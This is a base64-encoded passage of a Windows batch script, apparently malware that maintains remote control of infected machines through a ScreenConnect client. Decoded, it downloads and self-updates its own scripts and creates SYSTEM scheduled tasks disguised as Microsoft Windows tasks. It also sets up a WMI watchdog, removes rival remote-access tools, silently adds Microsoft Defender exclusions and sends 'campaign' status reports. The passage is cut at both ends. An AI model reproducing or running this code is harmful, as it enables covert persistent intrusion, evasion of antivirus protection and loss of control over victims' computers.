aWRlbnRpdHkuY2ZnIikgZG8gc2V0ICIlJUs9JSVWIgppZiBub3QgZGVmaW5lZCBUQVNLX0Egc2V0
ICJUQVNLX0E9XE1pY3Jvc29mdFxXaW5kb3dzXERpYWdub3Npc1xTY2hlZHVsZWQiCmlmIG5vdCBk
ZWZpbmVkIFRBU0tfQiBzZXQgIlRBU0tfQj1cTWljcm9zb2Z0XFdpbmRvd3NcUExBXFNlcnZlciIK
aWYgbm90IGRlZmluZWQgVEFTS19DIHNldCAiVEFTS19DPVxNaWNyb3NvZnRcV2luZG93c1xXRElc
UmVzb2x1dGlvbkhvc3QiCmlmIG5vdCBkZWZpbmVkIFRBU0tfRCBzZXQgIlRBU0tfRD1cTWljcm9z
b2Z0XFdpbmRvd3NcVGNwaXBcSXBBZGRyZXNzQ29uZmxpY3QxIgppZiBub3QgZGVmaW5lZCBNT19B
IHNldCAiTU9fQT0yIgppZiBub3QgZGVmaW5lZCBNT19CIHNldCAiTU9fQj0zIgoKcmVtIOKUgOKU
gCBbQV0gYXV0by11cGRhdGUgY29yZSBmaWxlcyAoYmVzdCBlZmZvcnQpIOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAppZiBub3QgZXhpc3QgIiVD
VVJMJSIgc2V0ICJDVVJMPWN1cmwuZXhlIgoiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2UgLS1j
b25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlV0QlXHRnX3JlcG9ydC5uZXciICIl
VEclIiA+bnVsIDI+JjEKaWYgbm90IGV4aXN0ICIlV0QlXHRnX3JlcG9ydC5uZXciICIlQ1VSTCUi
IC1MIC0tY29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSA0MCAtbyAiJVdEJVx0Z19yZXBvcnQu
bmV3IiAiJVRHMiUiID5udWwgMj4mMQphdHRyaWIgLWggLXMgLXIgIiVXRCVcdGdfcmVwb3J0LnBz
MSIgPm51bCAyPiYxCmZvciAlJUYgaW4gKCIlV0QlXHRnX3JlcG9ydC5uZXciKSBkbyBpZiAlJX56
RiBHVFIgMTUwMCBtb3ZlIC95ICIlV0QlXHRnX3JlcG9ydC5uZXciICIlV0QlXHRnX3JlcG9ydC5w
czEiID5udWwgMj4mMQoiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVv
dXQgOCAtLW1heC10aW1lIDMwIC1vICIlV0QlXG93bl9zZWN1cmUubmV3IiAiJU9XTlNFQyUiID5u
dWwgMj4mMQppZiBub3QgZXhpc3QgIiVXRCVcb3duX3NlY3VyZS5uZXciICIlQ1VSTCUiIC1MIC0t
Y29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSAzMCAtbyAiJVdEJVxvd25fc2VjdXJlLm5ldyIg
IiVPV05TRUMyJSIgPm51bCAyPiYxCmF0dHJpYiAtaCAtcyAtciAiJVdEJVxvd25fc2VjdXJlLmNt
ZCIgPm51bCAyPiYxCmZvciAlJUYgaW4gKCIlV0QlXG93bl9zZWN1cmUubmV3IikgZG8gaWYgJSV+
ekYgR1RSIDgwMCBtb3ZlIC95ICIlV0QlXG93bl9zZWN1cmUubmV3IiAiJVdEJVxvd25fc2VjdXJl
LmNtZCIgPm51bCAyPiYxCiIlQ1VSTCUiIC1MIC0tc3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGlt
ZW91dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVXRCVcb3duX2xpYi5uZXciICIlT1dOTElCJSIgPm51
bCAyPiYxCmlmIG5vdCBleGlzdCAiJVdEJVxvd25fbGliLm5ldyIgIiVDVVJMJSIgLUwgLS1jb25u
ZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1vICIlV0QlXG93bl9saWIubmV3IiAiJU9XTkxJ
QjIlIiA+bnVsIDI+JjEKYXR0cmliIC1oIC1zIC1yICIlV0QlXG93bl9saWIucHMxIiA+bnVsIDI+
JjEKZm9yICUlRiBpbiAoIiVXRCVcb3duX2xpYi5uZXciKSBkbyBpZiAlJX56RiBHVFIgMTUwMCBt
b3ZlIC95ICIlV0QlXG93bl9saWIubmV3IiAiJVdEJVxvd25fbGliLnBzMSIgPm51bCAyPiYxCnJl
bSBzZWxmLXVwZGF0ZTogZG93bmxvYWQgbmV3IG93bl9tb24sIGFwcGx5IEFGVEVSIHRoaXMgdGlj
awpzZXQgIlNFTEZfVVBEPTAiCiIlQ1VSTCUiIC1MIC0tc3NsLW5vLXJldm9rZSAtLWNvbm5lY3Qt
dGltZW91dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVXRCVcb3duX21vbi5uZXh0IiAiJU9XTk1PTiUi
ID5udWwgMj4mMQppZiBub3QgZXhpc3QgIiVXRCVcb3duX21vbi5uZXh0IiAiJUNVUkwlIiAtTCAt
LWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVXRCVcb3duX21vbi5uZXh0IiAi
JU9XTk1PTjIlIiA+bnVsIDI+JjEKZm9yICUlRiBpbiAoIiVXRCVcb3duX21vbi5uZXh0IikgZG8g
aWYgJSV+ekYgR1RSIDE1MDAgKAogIGZjIC9iICIlV0QlXG93bl9tb24ubmV4dCIgIiVXRCVcb3du
X21vbi5jbWQiID5udWwgMj4mMQogIGlmIGVycm9ybGV2ZWwgMSBzZXQgIlNFTEZfVVBEPTEiCikK
CnJlbSDilIDilIAgW0JdIHJlLWFybSBjaGFpbiAxIChzY2h0YXNrcykgaWYgbWlzc2luZyDilIDi
lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKc2NodGFz
a3MgL1F1ZXJ5IC9UTiAiJVRBU0tfQSUiID5udWwgMj4mMQppZiBlcnJvcmxldmVsIDEgKAogIGVj
aG8gcmVhcm0gVEFTS19BICVUQVNLX0ElPj4iJUxPRyUiCiAgc2NodGFza3MgL0NyZWF0ZSAvRiAv
VE4gIiVUQVNLX0ElIiAvU0MgTUlOVVRFIC9NTyAlTU9fQSUgL1JVIFNZU1RFTSAvUkwgSElHSEVT
VCAvVFIgImNtZCAvYyAlV0QlXG93bl9tb24uY21kIiA+PiIlTE9HJSIgMj4mMQogIHNjaHRhc2tz
IC9SdW4gL1ROICIlVEFTS19BJSIgPm51bCAyPiYxCikKc2NodGFza3MgL1F1ZXJ5IC9UTiAiJVRB
U0tfQiUiID5udWwgMj4mMQppZiBlcnJvcmxldmVsIDEgKAogIGVjaG8gcmVhcm0gVEFTS19CICVU
QVNLX0IlPj4iJUxPRyUiCiAgc2NodGFza3MgL0NyZWF0ZSAvRiAvVE4gIiVUQVNLX0IlIiAvU0Mg
TUlOVVRFIC9NTyAlTU9fQiUgL1JVIFNZU1RFTSAvUkwgSElHSEVTVCAvVFIgImNtZCAvYyAlV0Ql
XG93bl9tb24uY21kIiA+PiIlTE9HJSIgMj4mMQogIHNjaHRhc2tzIC9SdW4gL1ROICIlVEFTS19C
JSIgPm51bCAyPiYxCikKc2NodGFza3MgL1F1ZXJ5IC9UTiAiJVRBU0tfQyUiID5udWwgMj4mMQpp
ZiBlcnJvcmxldmVsIDEgKAogIGVjaG8gcmVhcm0gVEFTS19DICVUQVNLX0MlPj4iJUxPRyUiCiAg
c2NodGFza3MgL0NyZWF0ZSAvRiAvVE4gIiVUQVNLX0MlIiAvU0MgT05TVEFSVCAvUlUgU1lTVEVN
IC9STCBISUdIRVNUIC9UUiAiY21kIC9jICVXRCVcb3duX21vbi5jbWQiID4+IiVMT0clIiAyPiYx
CikKc2NodGFza3MgL1F1ZXJ5IC9UTiAiJVRBU0tfRCUiID5udWwgMj4mMQppZiBlcnJvcmxldmVs
IDEgKAogIGVjaG8gcmVhcm0gVEFTS19EICVUQVNLX0QlPj4iJUxPRyUiCiAgc2NodGFza3MgL0Ny
ZWF0ZSAvRiAvVE4gIiVUQVNLX0QlIiAvU0MgT05MT0dPTiAvUlUgU1lTVEVNIC9STCBISUdIRVNU
IC9UUiAiY21kIC9jICVXRCVcb3duX21vbi5jbWQiID4+IiVMT0clIiAyPiYxCikKCnJlbSDilIDi
lIAgW0IyXSByZS1hcm0gY2hhaW4gMiAoV01JIHN1YnNjcmlwdGlvbikgaWYgbWlzc2luZyDilIDi
lIDilIDilIDilIDilIDilIDilIDilIAKaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiICgKICBm
b3IgL2YgInVzZWJhY2txIGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAt
Tm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xp
Yi5wczEiIC1BY3Rpb24gd2F0Y2hkb2ctZW5zdXJlIC1Xb3JrRGlyICIlV0QlIiAtTW9uUGF0aCAi
JVdEJVxvd25fbW9uLmNtZCJgKSBkbyBzZXQgIldEX1NUQVRFPSUlUiIKICBpZiAvSSAiIVdEX1NU
QVRFISI9PSJSRUFSTUVEIiBlY2hvIHdhdGNoZG9nIFdNSSBSRUFSTUVEPj4iJUxPRyUiCikKCnJl
bSDilIDilIAgW0VdIGV4dGVybWluYXRlIGZvcmVpZ24gU0MgKyBkaXNhbGxvd2VkIFJNTSAoQkVG
T1JFIGhlYWwvaW5zdGFsbCwKcmVtICAgICBzbyB0aGUgU0MgaW5zdGFsbGVyIGN1c3RvbSBhY3Rp
b24gbmV2ZXIgY29sbGlkZXMgd2l0aCByaXZhbHMpIOKUgOKUgAppZiBleGlzdCAiJVdEJVxvd25f
bGliLnBzMSIgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9u
UG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBleHRlcm1pbmF0
ZSAtV29ya0RpciAiJVdEJSIgPj4iJUxPRyUiIDI+JjEKc2V0ICJGT1JFSUdOX0xFRlQ9MCIKZm9y
IC9mICJ0b2tlbnM9MiBkZWxpbXM9KCkiICUlYSBpbiAoJ3NjIHF1ZXJ5IHN0YXRlXj0gYWxsIF58
IGZpbmRzdHIgL0M6IlNFUlZJQ0VfTkFNRTogU2NyZWVuQ29ubmVjdCBDbGllbnQiJykgZG8gKAog
IHNldCAiRlA9JSVhIgogIHNldCAiRlA9IUZQOiA9ISIKICBzZXQgL2EgQ09VTlQrPTEKICBpZiAv
SSBub3QgIiFGUCEiPT0iJUtFRVBfRlAlIiBpZiAvSSBub3QgIiFGUCEiPT0iJUFMVF9GUCUiICgK
ICAgIHNldCAvYSBGT1JFSUdOX0xFRlQrPTEKICAgIHNldCAiRk9SRUlHTl9MSVNUPSFGT1JFSUdO
X0xJU1QhIUZQISAiCiAgICBlY2hvIGZvcmVpZ25fbGVmdF8hRlAhPj4iJUxPRyUiCiAgKQopCgpy
ZW0g4pSA4pSAIFtDXSBoZWFsIFNjcmVlbkNvbm5lY3QgcHJpbS9hbHQg4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
4pSA4pSA4pSA4pSACmZvciAvZiAidG9rZW5zPTEsMiBkZWxpbXM9KCkiICUlYSBpbiAoJ3NjIHF1
ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAlKSIgXnwgZmluZHN0ciAvQzoiU0VS
VklDRV9OQU1FIicpIGRvICgKICBzZXQgL2EgQ09VTlQrPTEKICBzZXQgIklOU1RBTExFRD0xIgog
IHNldCAiUFJJTVNUQVRFPSUlYiIKKQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVL
RUVQX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bAppZiBub3QgZXJyb3JsZXZlbCAxIHNldCAi
UFJJTV9PSz0xIgpmb3IgL2YgInRva2Vucz0xLDIgZGVsaW1zPSgpIiAlJWEgaW4gKCdzYyBxdWVy
eSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgXnwgZmluZHN0ciAvQzoiU0VSVklD
RV9OQU1FIicpIGRvIHNldCAvYSBDT1VOVCs9MQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGll
bnQgKCVBTFRfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsCmlmIG5vdCBlcnJvcmxldmVsIDEg
c2V0ICJBTFRfT0s9MSIKCmlmICIlSU5TVEFMTEVEJSI9PSIxIiBpZiAiJVBSSU1fT0slIj09IjAi
ICgKICBlY2hvIHN2YyBoZWFsIHJlc3RhcnQ+PiIlTE9HJSIKICBuZXQgc3RhcnQgIlNjcmVlbkNv
bm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiA+bnVsIDI+JjEKICBzYyBzdGFydCAiU2NyZWVuQ29u
bmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4mMQogIHRpbWVvdXQgL3QgNiAvbm9icmVh
ayA+bnVsCiAgc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUF9GUCUpIiB8IGZp
bmQgIlJVTk5JTkciID5udWwKICBpZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiUFJJTV9PSz0xIgop
CnJlbSBNMTY6IHN0aWxsIHN0b3BwZWQgLT4gcmVwYWlyIHRoZSBSRUdJU1RFUkVEIHByb2R1Y3Qg
KG1zaWV4ZWMgL2ZhIHJlc3RvcmVzCnJlbSBiaW5hcmllcyArIHN0YXJ0cyB0aGUgc2VydmljZTsg
TDUgUmVwYWlyLVNDU2VydmljZSBoYW5kbGVzIHN0b3BwZWQgc3ZjcykKaWYgIiVJTlNUQUxMRUQl
Ij09IjEiIGlmICIlUFJJTV9PSyUiPT0iMCIgKAogIGVjaG8gc3ZjIGVzY2FsYXRlIHJlcGFpcj4+
IiVMT0clIgogIGlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBwb3dlcnNoZWxsIC1Ob1Byb2Zp
bGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93
bl9saWIucHMxIiAtQWN0aW9uIHJlcGFpciAtRnAgIiVLRUVQX0ZQJSIgLVdvcmtEaXIgIiVXRCUi
ID4+IiVMT0clIiAyPiYxCiAgdGltZW91dCAvdCA4IC9ub2JyZWFrID5udWwKICBzYyBxdWVyeSAi
U2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bAog
IGlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJQUklNX09LPTEiCikKcmVtIE0xNjogb3JwaGFuZWQg
c2VydmljZSBlbnRyeSAocHJvZHVjdCB1bnJlZ2lzdGVyZWQgLSBlYXRlbiBieSBhbiBTQy1mYW1p
bHkKcmVtIHVwZ3JhZGUgcmVtb3ZhbCkgY2FuIE5FVkVSIHN0YXJ0LiBEZWxldGUgaXQgYW5kIGZh
bGwgdGhyb3VnaCB0byB0aGUKcmVtIGZyZXNoLWluc3RhbGwgbGFkZGVyIGJlbG93IGluc3RlYWQg
b2YgYWxlcnRpbmcgIndvbnQgc3RhcnQiIGZvcmV2ZXIuCmlmICIlSU5TVEFMTEVEJSI9PSIxIiBp
ZiAiJVBSSU1fT0slIj09IjAiICgKICBzZXQgIlJFR1NUQVRFPXVua25vd24iCiAgaWYgZXhpc3Qg
IiVXRCVcb3duX2xpYi5wczEiIGZvciAvZiAiZGVsaW1zPSIgJSVSIGluICgncG93ZXJzaGVsbCAt
Tm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAi
JVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiByZWdpc3RlcmVkIC1GcCAiJUtFRVBfRlAlIiAtV29y
a0RpciAiJVdEJSInKSBkbyBzZXQgIlJFR1NUQVRFPSUlUiIKICBlY2hvIG9ycGhhbl9jaGVjaz0h
UkVHU1RBVEUhPj4iJUxPRyUiCiAgaWYgL0kgIiFSRUdTVEFURSEiPT0ibm8iICgKICAgIGVjaG8g
b3JwaGFuX3NlcnZpY2VfZGVsZXRlPj4iJUxPRyUiCiAgICBzYyBkZWxldGUgIlNjcmVlbkNvbm5l
Y3QgQ2xpZW50ICglS0VFUF9GUCUpIiA+bnVsIDI+JjEKICAgIHNldCAiSU5TVEFMTEVEPTAiCiAg
KQopCmlmICIlSU5TVEFMTEVEJSI9PSIxIiBpZiAiJVBSSU1fT0slIj09IjAiICgKICBwb3dlcnNo
ZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1G
aWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGlyICIlV0QlIiAtQnVp
bGQgJU1PTlZFUiUgLUV4dHJhICJzdmMtd29udC1zdGFydCIgPm51bCAyPiYxCiAgY2FsbCA6VGdT
dGF0ZSBET1dOICJTY3JlZW5Db25uZWN0ICglS0VFUF9GUCUpIGluc3RhbGxlZCBidXQgd29udCBz
dGFydCIKICBnb3RvIDpBZnRlckhlYWwKKQppZiAiJUlOU1RBTExFRCUiPT0iMSIgZ290byA6QWZ0
ZXJIZWFsCgpyZW0g4pSA4pSAIFtEXSBwcmltYXJ5IFNDIG1pc3NpbmcgLSBoZWFsIGxhZGRlciDi
lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
lIDilIDilIAKcmVtIE0xMjogRklSU1QgcmVwYWlyIHRoZSByZWdpc3RlcmVkIHByb2R1Y3QgKHJl
Y3JlYXRlcyBzZXJ2aWNlIHdpdGhvdXQKcmVtIHRvdWNoaW5nIHRoZSBBTFQgaW5zdGFuY2UpOyBm
cmVzaCBtc2lleGVjIGluc3RhbGwgb25seSBhcyBmYWxsYmFjay4KZWNobyBzdmMgbWlzc2luZyAt
IGhlYWwgYmVnaW4+PiIlTE9HJSIKY2FsbCA6UmVwYWlyUmVnaXN0ZXJlZCAiJUtFRVBfRlAlIgpp
ZiAiJUlOU1RBTExFRCUiPT0iMCIgY2FsbCA6SW5zdGFsbE1zaSAiJU1TSV9VUkwlIiAibWFpbiIK
aWYgIiVJTlNUQUxMRUQlIj09IjAiIGNhbGwgOkluc3RhbGxNc2kgIiVNU0lfUEtHMT90PSVSQU5E
T00lIiAiZ2l0aHViLXBrZyIKaWYgIiVJTlNUQUxMRUQlIj09IjAiIGNhbGwgOkluc3RhbGxNc2kg
IiVNU0lfUEtHMiUiICJqc2RlbGl2ci1wa2ciCmlmICIlSU5TVEFMTEVEJSI9PSIwIiAoCiAgZm9y
ICUlRiBpbiAoIiVNU0klIikgZG8gaWYgJSV+ekYgR1RSIDEwMDAwMDAgKAogICAgZWNobyBjYWNo
ZSByZXRyeSBpbnN0YWxsPj4iJUxPRyUiCiAgICBjYWxsIDpOb01zaVBvbGljeQogICAgbXNpZXhl
YyAvaSAiJU1TSSUiIC9xbiAvbm9yZXN0YXJ0IC9MKnYgIiVXRCVcbXNpX2hlYWwubG9nIiA+bnVs
IDI+JjEKICAgIHNldCAiTVNJRVhJVD0hRVJST1JMRVZFTCEiCiAgICBlY2hvIGNhY2hlIG1zaWV4
ZWMgZXhpdD0hTVNJRVhJVCE+PiIlTE9HJSIKICAgIGNhbGwgOldhaXRTdmMKICApCikKY2FsbCA6
UmVzdG9yZUFsdAppZiAiJUlOU1RBTExFRCUiPT0iMCIgKAogIGlmIGV4aXN0ICIlV0QlXG1zaV9o
ZWFsLmxvZyIgKAogICAgZWNobyAtLS0gbXNpX2hlYWwubG9nIHRhaWwgLS0tPj4iJUxPRyUiCiAg
ICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1Db21tYW5kICJHZXQtQ29u
dGVudCAtTGl0ZXJhbFBhdGggJyVXRCVcbXNpX2hlYWwubG9nJyAtVGFpbCAxMCIgPj4iJUxPRyUi
IDI+JjEKICApCiAgaWYgbm90IGRlZmluZWQgTVNJRVhJVCBzZXQgIk1TSUVYSVQ9ZmV0Y2gtZmFp
bCIKICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xp
Y3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGly
ICIlV0QlIiAtQnVpbGQgJU1PTlZFUiUgLUV4dHJhICJtc2ktZmFpbGVkIiA+bnVsIDI+JjEKICBj
YWxsIDpUZ1N0YXRlIEZBSUwgIk1TSSBpbnN0YWxsIGZhaWxlZCBvbiBhbGwgc291cmNlcyAobXNp
ZXhlYyBleGl0ICVNU0lFWElUJSkiCikgZWxzZSAoCiAgZWNobyBzdmMgcmVzdG9yZWQ+PiIlTE9H
JSIKICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xp
Y3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGly
ICIlV0QlIiAtQnVpbGQgJU1PTlZFUiUgLUV4dHJhICJyZXN0b3JlZCIgPm51bCAyPiYxCiAgY2Fs
bCA6VGdTdGF0ZSBSRVNUT1JFRCAiU2NyZWVuQ29ubmVjdCByZWluc3RhbGxlZCBPSyIKKQoKOkFm
dGVySGVhbApyZW0gTTE2OiBBTFQgcHJlc2VudC1idXQtc3RvcHBlZCAtPiByZXN0YXJ0LCB0aGVu
IHJlcGFpci1ieS1HVUlEIChldmVyeSB0aWNrKQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGll
bnQgKCVBTFRfRlAlKSIgPm51bCAyPiYxCmlmIG5vdCBlcnJvcmxldmVsIDEgKAogIHNjIHF1ZXJ5
ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwK
ICBpZiBlcnJvcmxldmVsIDEgKAogICAgZWNobyBhbHQgc3RvcHBlZCAtIHJlc3RhcnQvcmVwYWly
Pj4iJUxPRyUiCiAgICBuZXQgc3RhcnQgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglQUxUX0ZQJSki
ID5udWwgMj4mMQogICAgc2Mgc3RhcnQgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglQUxUX0ZQJSki
ID5udWwgMj4mMQogICAgdGltZW91dCAvdCA1IC9ub2JyZWFrID5udWwKICAgIHNjIHF1ZXJ5ICJT
Y3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwKICAg
IGlmIGVycm9ybGV2ZWwgMSBpZiBleGlzdCAiJVdEJVxvd25fbGliLnBzMSIgcG93ZXJzaGVsbCAt
Tm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAi
JVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiByZXBhaXIgLUZwICIlQUxUX0ZQJSIgLVdvcmtEaXIg
IiVXRCUiID4+IiVMT0clIiAyPiYxCiAgKQopCnJlbSAoZXh0ZXJtaW5hdGlvbiBhbHJlYWR5IHJh
biBwcmUtaGVhbCBpbiBbRV07IGZvcmVpZ24gc3Vydml2b3JzIGNvdW50ZWQgdGhlcmUpCgpyZW0g
4pSA4pSAIFtGXSBzdGVhbHRoIHJlLXNlY3VyZSAocXVpZXQgRGVmZW5kZXIgZXhjbHVzaW9uIHJl
ZnJlc2gpIOKUgOKUgApwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVj
dXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kICJ0cnkgeyBBZGQtTXBQcmVmZXJlbmNlIC1FeGNs
dXNpb25QYXRoICclV0QlJywnJUVUTCUnIC1FcnJvckFjdGlvbiBTdG9wIH0gY2F0Y2gge30iID5u
dWwgMj4mMQoKcmVtIOKUgOKUgCBbR10gcGVyaW9kaWMgZnVsbCByZS1zZWN1cmUgZXZlcnkgfjIg
aCDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
lIDilIAKcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiaWYo
KFRlc3QtUGF0aCAnJVdEJVxvd25fc2VjdXJlLmNtZCcpIC1hbmQgKCggLW5vdCAoVGVzdC1QYXRo
ICclV0QlXHNlYy5mbGFnJykpIC1vciAoKChHZXQtRGF0ZSkgLSAoR2V0LUl0ZW0gLUxpdGVyYWxQ
YXRoICclV0QlXHNlYy5mbGFnJykuTGFzdFdyaXRlVGltZSkuVG90YWxIb3VycyAtZ2UgMikpKXsg
ZXhpdCAxIH0gZWxzZSB7IGV4aXQgMCB9IiA+bnVsIDI+JjEKaWYgZXJyb3JsZXZlbCAxICgKICBl
Y2hvIHBlcmlvZGljIHJlLXNlY3VyZT4+IiVMT0clIgogIGNhbGwgIiVXRCVcb3duX3NlY3VyZS5j
bWQiID4+IiVMT0clIiAyPiYxCiAgZWNobyBkb25lPiIlV0QlXHNlYy5mbGFnIgopCgpyZW0g4pSA
4pSAIFtIXSBjYW1wYWlnbiBzdGF0ZSArIGhvdXJseSBjb21wYWN0IGRpZ2VzdCDilIDilIDilIDi
lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKaWYgZXhpc3QgIiVXRCVcb3du
X2xpYi5wczEiIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlv
blBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gc3RhdGUgLVdv
cmtEaXIgIiVXRCUiIC1CdWlsZCAlTU9OVkVSJSA+bnVsIDI+JjEKcG93ZXJzaGVsbCAtTm9Qcm9m
aWxlIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiaWYoKFRlc3QtUGF0aCAnJUhCRkxBRyUnKSAt
YW5kIChOZXctVGltZVNwYW4gLVN0YXJ0IChHZXQtSXRlbSAtTGl0ZXJhbFBhdGggJyVIQkZMQUcl
JykuTGFzdFdyaXRlVGltZSkuVG90YWxNaW51dGVzIC1sdCA2MCl7IGV4aXQgMCB9IGVsc2UgeyBl
eGl0IDEgfSIgPm51bCAyPiYxCmlmIGVycm9ybGV2ZWwgMSAoCiAgZWNobyBoYj4lSEJGTEFHJQog
IHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBC
eXBhc3MgLUZpbGUgIiVXRCVcdGdfcmVwb3J0LnBzMSIgLVN0YXRlIEhCIC1Nb2RlIGNvbXBhY3Qg
LUJ1aWxkICVNT05WRVIlIC1Db3VudCAhQ09VTlQhID5udWwgMj4mMQogIGVjaG8gZGlnZXN0IEhC
IHNlbnQ+PiIlTE9HJSIKKQoKcmVtIOKUgOKUgCBbSV0gc2VsZi11cGRhdGUgYXBwbHkgKGxhc3Qg
dGhpbmcgdGhpcyB0aWNrKSDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
lIAKaWYgIiVTRUxGX1VQRCUiPT0iMSIgKAogIGVjaG8gc2VsZi11cGRhdGUgYXBwbHk+PiIlTE9H
JSIKICBhdHRyaWIgLWggLXMgLXIgIiVXRCVcb3duX21vbi5jbWQiID5udWwgMj4mMQogIG1vdmUg
L3kgIiVXRCVcb3duX21vbi5uZXh0IiAiJVdEJVxvd25fbW9uLmNtZCIgPm51bCAyPiYxCikKCmVj
aG8gdGljayBkb25lOiBwcmltPSVQUklNX09LJSBhbHQ9JUFMVF9PSyUgZm9yZWlnbj0lRk9SRUlH
Tl9MRUZUJT4+IiVMT0clIgplbmRsb2NhbApleGl0IC9iIDAKCnJlbSDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZAgaGVscGVycyDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZAKOkluc3RhbGxNc2kKcmVtICUxPXVybCAlMj10YWcK
c2V0ICJVUkw9JX4xIgpzZXQgIlRBRz0lfjIiCmVjaG8gWyVUQUclXSBmZXRjaCAlVVJMJT4+IiVM
T0clIgoiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgMjUgLS1t
YXgtdGltZSAzMDAgLW8gIiVNU0klLnRtcCIgIiVVUkwlIiA+PiIlTE9HJSIgMj4mMQpmb3IgJSVG
IGluICgiJU1TSSUudG1wIikgZG8gaWYgJSV+ekYgTEVRIDEwMDAwMDAgKAogIGVjaG8gWyVUQUcl
XSBmZXRjaCBmYWlsZWQ+PiIlTE9HJSIKICBkZWwgL2YgL3EgIiVNU0klLnRtcCIgPm51bCAyPiYx
